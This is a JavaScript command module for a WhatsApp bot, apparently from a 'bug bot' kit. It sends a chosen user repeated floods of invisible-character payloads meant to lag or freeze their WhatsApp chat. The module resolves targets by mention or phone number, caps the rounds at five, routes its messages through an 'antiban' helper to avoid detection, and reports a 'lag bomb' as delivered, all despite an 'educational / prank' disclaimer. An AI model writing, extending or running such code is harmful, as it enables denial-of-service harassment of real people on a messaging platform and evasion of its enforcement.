/**
 * 🐛 Tech God Bug 2026 — Creepy Lag (Whitespace + Invisible Char Flood)
 * Uses CREEPY_MD payloads — massive whitespace/invisible character floods
 * that lag WhatsApp rendering engine.
 * ⚠️ EDUCATIONAL / PRANK USE ONLY
 * By Dev-Ntando (payload source: CREEPY_MD-V1)
 */
'use strict';

const config  = require('../../config');
const antiban = require('../../utils/antiban');
const db      = require('../../database');

// Load creepy payloads (whitespace/invisible char based)
const { creepyd4 } = require('./creepy-data/creepyd4');
const { creepyd6 } = require('./creepy-data/creepyd6');
const { creepyd8 } = require('./creepy-data/creepyd8');

const payloads = [creepyd4, creepyd6, creepyd8].filter(Boolean);

module.exports = async (sock, msg, args, { isOwner, sender, jid }) => {
  if (!config.bugsEnabled.crash) {
    return antiban.sendHuman(sock, jid, { text: '❌ Crash bugs are currently disabled.' }, { quoted: msg });
  }

  const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
  let target = mentioned[0] || (args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null);

  if (!target) {
    return antiban.sendHuman(sock, jid, {
      text: `🐛 *Creepy Lag*\n\n*Usage:* ${config.prefix}creepylag @user [rounds]\n*Example:* ${config.prefix}creepylag @someone 2\n\n_Sends massive invisible character floods that cause extreme lag._\n_Target's WhatsApp will struggle to render the chat._`,
    }, { quoted: msg });
  }

  const rounds = Math.min(parseInt(args[1]) || 2, 5);

  await antiban.sendHuman(sock, jid, {
    text: `🐛 *Sending CREEPY lag bomb...*\n🎯 Target: @${target.split('@')[0]}\n💣 Rounds: ${rounds}\n⚡ Payload: Invisible Char Flood`,
    mentions: [target]
  }, { quoted: msg });

  for (let i = 0; i < rounds; i++) {
    const payload = payloads[i % payloads.length];
    // Handle both string and function payloads
    const text = typeof payload === 'function' ? payload(config.prefix) : payload;
    await sock.sendMessage(target, { text });
    await new Promise(r => setTimeout(r, 800));
  }

  db.incrementStat('totalBugs');
  db.incrementUserStat(sender, 'bugs');

  await antiban.sendHuman(sock, jid, {
    text: `✅ *Creepy lag sent!*\n🐛 ${rounds} invisible floods delivered to @${target.split('@')[0]}\n_Their chat should be lagging hard now._`,
    mentions: [target]
  }, { quoted: msg });
};
